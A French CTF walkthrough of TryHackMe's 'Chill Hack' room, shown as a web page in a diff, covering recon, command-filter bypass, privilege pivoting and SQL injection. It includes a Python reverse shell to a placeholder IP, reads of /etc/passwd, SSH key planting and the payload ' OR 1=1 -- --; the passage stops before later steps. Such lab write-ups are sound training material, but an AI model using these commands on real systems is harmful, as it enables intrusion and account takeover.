+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tags
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table des matières">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table des matières
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#informations-generales" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Informations générales
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#contexte-et-objectifs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Contexte et objectifs
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#methodologie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Méthodologie
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Méthodologie">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#etape-1-cartographie-des-services-avec-nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 1 : Cartographie des services avec Nmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-2-enumeration-ftp-anonyme" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 2 : Enumération FTP anonyme
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-3-enumeration-web-avec-gobuster" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 3 : Enumération web avec Gobuster
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-4-identification-et-bypass-du-filtre-de-commandes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 4 : Identification et bypass du filtre de commandes
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-5-reverse-shell-via-injection-de-commandes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 5 : Reverse shell via injection de commandes
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-6-mouvement-lateral-vers-apaar-via-helplinesh" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 6 : Mouvement latéral vers apaar via helpline.sh
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-7-flag-utilisateur" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 7 : Flag utilisateur
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-8-port-forwarding-et-acces-au-portail-interne" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 8 : Port forwarding et accès au portail interne
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-9-extraction-de-credentials-par-steganographie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 9 : Extraction de credentials par stéganographie
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-10-escalade-via-docker-anurodh-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 10 : Escalade via Docker (anurodh → root)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#synthese-technique" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Synthèse technique
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:command-injection" class="md-tag">Command Injection</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:docker" class="md-tag">Docker</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:ftp" class="md-tag">FTP</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:facile" class="md-tag">Facile</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:linux" class="md-tag">Linux</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:nmap" class="md-tag">Nmap</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:steganographie" class="md-tag">Steganographie</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:tryhackme" class="md-tag">TryHackMe</a>
+      
+    
+  </nav>
+
+
+  
+  
+
+
+<h1 id="chill-hack-tryhackme">Chill Hack - TryHackMe<a class="headerlink" href="#chill-hack-tryhackme" title="Permanent link">&para;</a></h1>
+<figure>
+<p><img alt="Chill Hack" src="../logo/chill-hack.png" width="250" /></p>
+</figure>
+<h2 id="informations-generales">Informations générales<a class="headerlink" href="#informations-generales" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Plateforme</strong></td>
+<td>TryHackMe</td>
+</tr>
+<tr>
+<td><strong>Type</strong></td>
+<td>Offensive / Challenge</td>
+</tr>
+<tr>
+<td><strong>Difficulté</strong></td>
+<td>Facile</td>
+</tr>
+<tr>
+<td><strong>Thématiques</strong></td>
+<td>Command injection avec bypass de filtre, steganographie, escalade via Docker</td>
+</tr>
+<tr>
+<td><strong>Prérequis</strong></td>
+<td>Bases Linux, HTTP, FTP, notions de steganographie, Docker</td>
+</tr>
+</tbody>
+</table>
+<h2 id="contexte-et-objectifs">Contexte et objectifs<a class="headerlink" href="#contexte-et-objectifs" title="Permanent link">&para;</a></h2>
+<p>Cette room propose une chaîne d'exploitation complète : FTP anonyme pour la reconnaissance initiale, injection de commandes sur un formulaire web avec contournement de filtre, stéganographie sur une image pour extraire des credentials, mouvement latéral entre utilisateurs, et escalade finale via l'appartenance au groupe Docker.</p>
+<div class="admonition info">
+<p class="admonition-title">À propos de cette room</p>
+<p>Chill Hack est une room polyvalente qui couvre plusieurs domaines en une seule chaîne. Le bypass de filtre par échappement de caractères et la technique d'escalade via Docker sont particulièrement représentatifs de scénarios rencontrés en pentest réel.</p>
+</div>
+<h2 id="methodologie">Méthodologie<a class="headerlink" href="#methodologie" title="Permanent link">&para;</a></h2>
+<h3 id="etape-1-cartographie-des-services-avec-nmap">Étape 1 : Cartographie des services avec Nmap<a class="headerlink" href="#etape-1-cartographie-des-services-avec-nmap" title="Permanent link">&para;</a></h3>
+<p>La première action est d'identifier les services exposés sur la cible. Nmap avec <code>-sC</code> (scripts par défaut) et <code>-sV</code> (détection de versions) donne une vue complète des ports ouverts et de ce qui tourne derrière.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>&lt;IP_cible&gt;
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_HJuftcHWWG.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_HJuftcHWWG.png" /></a></p>
+<p>Trois ports ouverts :</p>
+<ul>
+<li><strong>21/tcp</strong> : FTP (vsftpd 3.0.5) - Nmap signale <code>ftp-anon: Anonymous FTP login allowed</code> et liste déjà un fichier <code>note.txt</code> accessible sans authentification</li>
+<li><strong>22/tcp</strong> : SSH (OpenSSH 8.2p1)</li>
+<li><strong>80/tcp</strong> : HTTP (Apache 2.4.41) - titre de la page : "Game Info"</li>
+</ul>
+<div class="admonition tip">
+<p class="admonition-title">Pourquoi commencer par FTP ?</p>
+<p>On commence toujours par le service le plus permissif. FTP anonyme est une faiblesse évidente : si un accès sans authentification est possible, c'est la porte d'entrée prioritaire avant même de toucher au web.</p>
+</div>
+<h3 id="etape-2-enumeration-ftp-anonyme">Étape 2 : Enumération FTP anonyme<a class="headerlink" href="#etape-2-enumeration-ftp-anonyme" title="Permanent link">&para;</a></h3>
+<p>On exploite cet accès anonyme pour récupérer le fichier note.txt repéré par Nmap. Quand le client FTP demande un nom d'utilisateur, on saisit <code>anonymous</code>. Le mot de passe peut être vide.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ftp<span class="w"> </span>&lt;IP_cible&gt;
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Name: anonymous
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Password:
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>ls
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>get<span class="w"> </span>note.txt
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_o37Nojwlap.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_o37Nojwlap.png" /></a></p>
+<p>Une fois le fichier récupéré en local, on le lit :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>cat<span class="w"> </span>note.txt
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_x4Ru8vvst4.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_x4Ru8vvst4.png" /></a></p>
+<p>La note est signée par deux utilisateurs, <code>Apaar</code> et <code>Anurodh</code> : on dispose de deux noms d'utilisateurs potentiellement valides sur la machine. La note indique aussi qu'il y a "du filtrage sur les chaînes de caractères dans les commandes", un indice potentiel sur ce qu'on pourrait rencontrer sur l'interface web.</p>
+<h3 id="etape-3-enumeration-web-avec-gobuster">Étape 3 : Enumération web avec Gobuster<a class="headerlink" href="#etape-3-enumeration-web-avec-gobuster" title="Permanent link">&para;</a></h3>
+<p>Le FTP n'ayant rien donné de plus exploitable, on s'intéresse maintenant au service HTTP repéré à l'étape 1. En visitant <code>http://&lt;IP_cible&gt;</code>, on tombe sur une page génériques qui ne présente aucun contenu exploitable visible.</p>
+<p><a href="../screen/ChillHack/msrdc_a86vVZKwf6.png"><img alt="ChillHack" src="../screen/ChillHack/msrdc_a86vVZKwf6.png" /></a></p>
+<p>Une page vide en surface ne signifie pas que le serveur n'héberge rien d'autre. On lance une énumération de répertoires pour découvrir des chemins cachés :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://&lt;IP_cible&gt;<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirb/common.txt<span class="w"> </span>-x<span class="w"> </span>txt,php
+</span></code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">Pourquoi ajouter <code>-x txt,php</code> ?</p>
+<p>Sans cette option, Gobuster teste uniquement les chemins purs (ex : <code>/admin</code>). En ajoutant <code>-x txt,php</code>, il teste aussi <code>/admin.txt</code> et <code>/admin.php</code>. On ne connaît pas encore la technologie utilisée par le serveur, mais <code>.php</code> reste l'extension la plus répandue pour des pages exécutables côté serveur. L'extension <code>.txt</code> permet de trouver des fichiers de notes ou de credentials laissés sur le serveur.</p>
+</div>
+<p><a href="../screen/ChillHack/WindowsTerminal_Cqsl4dZeGe.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_Cqsl4dZeGe.png" /></a></p>
+<p>Gobuster découvre le répertoire <code>/secret</code> (statut 301). On s'y rend dans le navigateur : c'est une page avec un unique champ de saisie et un bouton "Execute".</p>
+<h3 id="etape-4-identification-et-bypass-du-filtre-de-commandes">Étape 4 : Identification et bypass du filtre de commandes<a class="headerlink" href="#etape-4-identification-et-bypass-du-filtre-de-commandes" title="Permanent link">&para;</a></h3>
+<p>On commence par vérifier si ce champ exécute réellement des commandes système en testant quelque chose d'inoffensif :</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>id
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/msrdc_lQL9K4VLor.png"><img alt="ChillHack" src="../screen/ChillHack/msrdc_lQL9K4VLor.png" /></a></p>
+<p>La commande s'exécute et renvoie <code>uid=33(www-data)</code> : le serveur exécute nos entrées directement en tant que <code>www-data</code>. On tente ensuite <code>ls</code> pour lister les fichiers :</p>
+<p><a href="../screen/ChillHack/msrdc_xHUkGeQJuw.png"><img alt="ChillHack" src="../screen/ChillHack/msrdc_xHUkGeQJuw.png" /></a></p>
+<p><code>ls</code> est bloqué : la page affiche "Are you a hacker?". Il existe un filtre par liste noire qui rejette certaines commandes.</p>
+<p>On peut contourner ce filtre avec un backslash pour lister les fichiers du répertoire courant :</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>l\s -la
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/msrdc_8uQBHLJr4u.png"><img alt="ChillHack" src="../screen/ChillHack/msrdc_8uQBHLJr4u.png" /></a></p>
+<div class="admonition tip">
+<p class="admonition-title">Comment fonctionne le bypass par backslash ?</p>
+<p>Le filtre compare l'entrée à une liste de chaînes exactes. En insérant un backslash dans le nom d'une commande (<code>l\s</code>, <code>c\at</code>), on modifie la chaîne comparée : <code>l\s</code> ne correspond pas à <code>ls</code>, donc le filtre laisse passer. Mais le shell Linux interprète le backslash comme un caractère d'échappement inoffensif et exécute quand même la commande normalement.</p>
+</div>
+<p>On peut également lire des fichiers arbitraires sur le système :</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>c\at /etc/passwd
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/msrdc_cKEwtiPTPc.png"><img alt="ChillHack" src="../screen/ChillHack/msrdc_cKEwtiPTPc.png" /></a></p>
+<p>Le bypass fonctionne. On peut exécuter n'importe quelle commande avec cette technique, y compris lire le code source de la page elle-même pour confirmer l'étendue du filtre :</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>c\at index.php
+</span></code></pre></div>
+<p>Le fichier révèle la liste complète des mots bloqués : <code>ls</code>, <code>cat</code>, <code>bash</code>, <code>sh</code>, <code>python</code>, <code>python3</code>, <code>nc</code>, <code>head</code>, <code>tail</code>, <code>more</code>, <code>less</code>, <code>php</code>, <code>perl</code>, <code>rm</code>.</p>
+<h3 id="etape-5-reverse-shell-via-injection-de-commandes">Étape 5 : Reverse shell via injection de commandes<a class="headerlink" href="#etape-5-reverse-shell-via-injection-de-commandes" title="Permanent link">&para;</a></h3>
+<p>Le filtre étant maintenant contourné et bien compris, on peut aller plus loin qu'exécuter des commandes isolées une par une. Interagir via un formulaire web est très limité : pas d'historique, pas d'interactivité, et chaque commande est une requête HTTP indépendante. On cherche à obtenir un shell interactif sur notre machine d'attaque.</p>
+<p><code>nc</code> et <code>bash</code> sont dans la liste noire, mais <code>python3</code> peut être bypassé avec <code>p\ython3</code>. On prépare d'abord un listener Netcat sur notre machine :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div>
+<p>Puis on soumet le reverse shell Python dans le champ de la page <code>/secret</code> :</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>p\ython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;VOTRE_IP&gt;",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/msrdc_7Zc5Nnvcl5.png"><img alt="ChillHack" src="../screen/ChillHack/msrdc_7Zc5Nnvcl5.png" /></a></p>
+<p><a href="../screen/ChillHack/WindowsTerminal_PxYN7uj3eT.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_PxYN7uj3eT.png" /></a></p>
+<p>On reçoit une connexion entrante sur notre listener : on dispose maintenant d'un shell <code>www-data</code> interactif.</p>
+<h3 id="etape-6-mouvement-lateral-vers-apaar-via-helplinesh">Étape 6 : Mouvement latéral vers apaar via helpline.sh<a class="headerlink" href="#etape-6-mouvement-lateral-vers-apaar-via-helplinesh" title="Permanent link">&para;</a></h3>
+<p>Depuis le shell <code>www-data</code>, la première chose à vérifier est ce que cet utilisateur peut faire avec des droits élevés. <code>sudo -l</code> liste les commandes que l'utilisateur courant est autorisé à exécuter avec sudo, telles que définies dans le fichier <code>/etc/sudoers</code> :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>sudo<span class="w"> </span>-l
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_vn4z0r1xPj.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_vn4z0r1xPj.png" /></a></p>
+<p><code>www-data</code> peut exécuter <code>/home/apaar/.helpline.sh</code> en tant qu'<code>apaar</code> sans mot de passe (<code>NOPASSWD</code>). On lit le contenu de ce script pour comprendre ce qu'il fait avant de l'exécuter avec des droits élevés. L'analyse révèle qu'il pose deux questions interactives et exécute directement la réponse utilisateur avec <code>$msg 2&gt;/dev/null</code>, sans aucune validation.</p>
+<p>On lance le script :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>sudo<span class="w"> </span>-u<span class="w"> </span>apaar<span class="w"> </span>/home/apaar/.helpline.sh
+</span></code></pre></div>
+<p>A la première invite, on entre n'importe quel nom :</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>Enter the person whom you want to talk with: managone
+</span></code></pre></div>
+<p>A la seconde invite, au lieu d'un message texte, on entre <code>/bin/bash</code> :</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>Hello user! I am managone, Please enter your message: /bin/bash
+</span></code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">Pourquoi /bin/bash fonctionne ici ?</p>
+<p>Le script fait littéralement <code>$msg 2&gt;/dev/null</code> : il exécute le contenu de la variable comme une commande shell. En tapant <code>/bin/bash</code>, on lance un interpréteur bash qui s'exécute avec l'identité d'apaar, puisque le script tourne via <code>sudo -u apaar</code>.</p>
+</div>
+<p><a href="../screen/ChillHack/WindowsTerminal_So6HSHpag5.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_So6HSHpag5.png" /></a></p>
+<p><code>whoami</code> confirme qu'on est maintenant <code>apaar</code>. Le shell est minimal, on le stabilise avec Python :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_WYYKfel7e1.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_WYYKfel7e1.png" /></a></p>
+<p>Ce shell stabilisé reste néanmoins rattaché à la connexion reverse shell initiale : il disparaît si celle-ci tombe, et ne permet pas de rediriger du trafic réseau. Pour la suite, on a besoin d'une session SSH stable avec apaar. Comme on ne connait pas son mot de passe, on dépose notre propre clé publique dans ses <code>authorized_keys</code>. Sur notre machine d'attaque, on génère une paire de clés dédiée :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>ssh-keygen<span class="w"> </span>-f<span class="w"> </span>apaar
+</span></code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">Pourquoi <code>-f</code> ?</p>
+<p><code>-f</code> spécifie le nom du fichier de sortie pour la paire de clés générée : <code>apaar</code> (clé privée) et <code>apaar.pub</code> (clé publique). Sans cette option, <code>ssh-keygen</code> propose par défaut <code>~/.ssh/id_rsa</code>, ce qui écraserait une éventuelle clé personnelle déjà présente.</p>
+</div>
+<p><a href="../screen/ChillHack/WindowsTerminal_znuy2ECr8x.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_znuy2ECr8x.png" /></a></p>
+<p><a href="../screen/ChillHack/WindowsTerminal_cm4uC625PS.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_cm4uC625PS.png" /></a></p>
+<p>On affiche la clé publique pour la copier :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>cat<span class="w"> </span>apaar.pub
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_o1f9GqXb0I.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_o1f9GqXb0I.png" /></a></p>
+<p>Depuis le shell apaar sur la cible, on crée le dossier <code>.ssh</code> :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>/home/apaar/.ssh
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_7aOTpgomxk.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_7aOTpgomxk.png" /></a></p>
+<p>On y dépose ensuite la clé publique générée à l'étape précédente. Dans la commande ci-dessous, la valeur après <code>ssh-ed25519</code> est un exemple à remplacer par le contenu réel affiché par <code>cat apaar.pub</code> :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"ssh-ed25519 AAAA...votre_cle_publique..."</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/home/apaar/.ssh/authorized_keys
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>chmod<span class="w"> </span><span class="m">700</span><span class="w"> </span>/home/apaar/.ssh
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>/home/apaar/.ssh/authorized_keys
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_0iKo7ZKheX.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_0iKo7ZKheX.png" /></a></p>
+<div class="admonition tip">
+<p class="admonition-title">Pourquoi ces deux chmod ?</p>
+<p>Le démon SSH refuse d'utiliser un dossier <code>.ssh</code> ou un fichier <code>authorized_keys</code> dont les permissions sont trop ouvertes (accessibles en écriture par le groupe ou par tout le monde). <code>chmod 700</code> restreint le dossier au propriétaire uniquement, <code>chmod 600</code> fait de même pour le fichier. Sans ça, OpenSSH ignore silencieusement la clé déposée et la connexion par clé échoue.</p>
+</div>
+<p>On donne également les permissions correctes à la clé privée sur notre machine d'attaque, puis on se connecte :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>apaar
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>ssh<span class="w"> </span>-i<span class="w"> </span>apaar<span class="w"> </span>apaar@&lt;IP_cible&gt;
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_WJgwbSobAC.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_WJgwbSobAC.png" /></a></p>
+<h3 id="etape-7-flag-utilisateur">Étape 7 : Flag utilisateur<a class="headerlink" href="#etape-7-flag-utilisateur" title="Permanent link">&para;</a></h3>
+<p>La session SSH stable établie, on en profite pour récupérer le flag utilisateur dans le répertoire d'apaar :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>cat<span class="w"> </span>/home/apaar/local.txt
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_zATFtkJTFD.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_zATFtkJTFD.png" /></a></p>
+<div class="admonition success">
+<p class="admonition-title">Réponse</p>
+<p><strong>User flag</strong> → <code>{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}</code></p>
+</div>
+<h3 id="etape-8-port-forwarding-et-acces-au-portail-interne">Étape 8 : Port forwarding et accès au portail interne<a class="headerlink" href="#etape-8-port-forwarding-et-acces-au-portail-interne" title="Permanent link">&para;</a></h3>
+<p>Le flag utilisateur obtenu, on poursuit l'exploration de la machine en tant qu'apaar à la recherche d'autres pistes. Depuis notre session SSH, on liste les ports en écoute sur la machine pour détecter des services non exposés publiquement :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>ss<span class="w"> </span>-tlnp
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_RQICEWwMGo.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_RQICEWwMGo.png" /></a></p>
+<p>Le port 9001 écoute uniquement sur <code>127.0.0.1</code> : il n'est pas accessible depuis l'extérieur. Pour y accéder depuis notre navigateur, on crée un tunnel SSH dans un nouveau terminal sur notre machine d'attaque, en réutilisant la clé privée d'apaar :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>ssh<span class="w"> </span>-i<span class="w"> </span>apaar<span class="w"> </span>-L<span class="w"> </span><span class="m">9001</span>:localhost:9001<span class="w"> </span>apaar@&lt;IP_cible&gt;
+</span></code></pre></div>
+<div class="admonition info">
+<p class="admonition-title">Qu'est-ce que le port forwarding SSH ?</p>
+<p>L'option <code>-L 9001:localhost:9001</code> redirige notre port local 9001 vers le port 9001 du serveur distant. Tout ce qu'on envoie sur <code>localhost:9001</code> depuis notre machine transite par le tunnel SSH et arrive sur <code>127.0.0.1:9001</code> de la cible. Apaar n'a pas de mot de passe connu, l'authentification se fait avec la clé déposée à l'étape précédente.</p>
+</div>
+<p><a href="../screen/ChillHack/WindowsTerminal_cRfGmuuahx.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_cRfGmuuahx.png" /></a></p>
+<p>On accède à <code>http://localhost:9001</code> depuis le navigateur : c'est un "Customer Portal" avec un formulaire de connexion (username + password).</p>
+<p><a href="../screen/ChillHack/msrdc_cTP43xJwhN.png"><img alt="ChillHack" src="../screen/ChillHack/msrdc_cTP43xJwhN.png" /></a></p>
+<p>On n'a aucun credential valide pour ce portail. On teste une injection SQL classique dans le champ username :</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>' OR 1=1 -- --
+</span></code></pre></div>
+<p>Le champ password peut contenir n'importe quoi.</p>
+<p><a href="../screen/ChillHack/msrdc_lcwhpoapsC.png"><img alt="ChillHack" src="../screen/ChillHack/msrdc_lcwhpoapsC.png" /></a></p>
+<p>La connexion aboutit et on arrive sur une page différente, affichant une image.</p>
+<div class="admonition tip">
+<p class="admonition-title">Pourquoi tester une injection SQL ici ?</p>
+<p>Tout formulaire de connexion sans protection visible est une cible classique pour les injections SQL. On ne connait pas le code source du serveur à ce stade, mais on peut supposer qu'il compare les champs saisis à une base de données. Le payload <code>' OR 1=1 -- --</code> est le test standard : il ferme prématurément la chaîne de caractères avec <code>'</code>, ajoute une condition toujours vraie (<code>OR 1=1</code>), et commente le reste de la requête avec <code>-- --</code>. Si le code ne filtre pas les entrées, ce payload court-circuite la vérification. Le fait que la connexion aboutisse confirme que l'injection SQL fonctionne.</p>
+</div>
